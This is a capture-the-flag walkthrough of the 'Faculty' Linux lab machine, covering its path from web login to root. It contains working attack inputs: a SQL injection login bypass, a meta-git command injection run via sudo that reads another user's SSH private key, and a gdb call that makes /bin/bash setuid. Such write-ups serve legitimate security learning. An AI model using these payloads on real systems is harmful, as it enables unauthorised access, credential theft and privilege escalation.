# Faculty
### Linux Box

##### Start with an `nmap` scan that shows open ports 22 and 80. Heading over to port 80 we find a login page.

![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FtpBc3ngEj5mgbNZW914Q%2Fimage.png?alt=media&token=7fba467f-3ef9-4a6f-a159-03292b099278 "nmap results")

##### The login page was vulnerable to SQLi, but I couldn't extract any useful information. Next, I employed the tool called ffuf to discover the subdomain. Through its usage, I was able to identify the subdomain.
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST: FUZZ.faculty.htb" -u http://faculty.htb -mc 200
```
##### No subdomains but I found the `/admin/login` page. I was able to login using `' OR 1=1#` as the username.
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FCg6itFHlBhhiOALJZP5r%2Fimage.png?alt=media&token=30dde0de-b2e9-4fe5-b80f-27395a94e1c5 "admin login")

##### Downloading the pdf from the admin panel, I found the app was using mpdf. A quick search with searchsploit shows multiple vulnerabilities
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FprphWunbnrSB9vY4M32D%2Fimage.png?alt=media&token=5b78ff0c-0b6f-46b8-a589-bf2323480d49 "searchsploit results")

##### I was able to grab a few files from the server. I found credentials for the user `gbyolo` in the `db_connect.php` file.
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FvWeeHIjZNECM0EfQsnv0%2Fimage.png?alt=media&token=da855f14-a017-4844-bcf0-9be0d54d9222 "db_connect.php")

##### ssh into `gbyolo` using the found credentials
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2F33r9Xst9PFRyqnpjHyjG%2Fimage.png?alt=media&token=8be8d48b-6f5d-4748-9af7-8dcc7a9c08d0 "foothold")

##### I discovered a file named `gbyolo` within the `/var/mail` directory. According to its contents, `gbyolo` possesses the ability to oversee git repositories associated with the faculty group. In addition, I executed the command `sudo -l` using the obtained password to determine the specific sudo privileges assigned to gbyolo.
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2F33r9Xst9PFRyqnpjHyjG%2Fimage.png?alt=media&token=8be8d48b-6f5d-4748-9af7-8dcc7a9c08d0 "gbyolo file")

[This hackerone report was helpfull for the next step](https://hackerone.com/reports/728040)

##### Using the exploit, run `sudo -u developer meta-git clone 'sss | cat ~/.ssh/id_rsa'`
[alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FsKtY25lSommhunlw5kUf%2Fimage.png?alt=media&token=a33d4792-104b-44c8-8630-6ca691890b69 "id_rsa")

##### ssh into the developer account after giving `id_rsa` proper permissions. `chmod 600 id_rsa`
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FsUcm3E1PKy2j5hmiQXGB%2Fimage.png?alt=media&token=1edbae46-cb9c-4cc2-ae96-fb8cee137222 "kick some shell")

##### Run linpeas on the target
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FUb7VQxgMw9z7rt8zbwr1%2Fimage.png?alt=media&token=3c5cfccc-1b1a-4ba6-b069-4362f6be46e4 "linpeas output")

##### Running `ps aux | grep root | grep python3` will get the vulnerable process as well.

##### Use gdb to hijack the process and get root

```gbd
(gbd) call (void)system("chmod u+s /bin/bash")
(gbd) quit
```
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2F048527wX5mSLyoBItEyP%2Fimage.png?alt=media&token=42836c41-2e64-4fe5-ae62-479f06cab3ee "gbd")




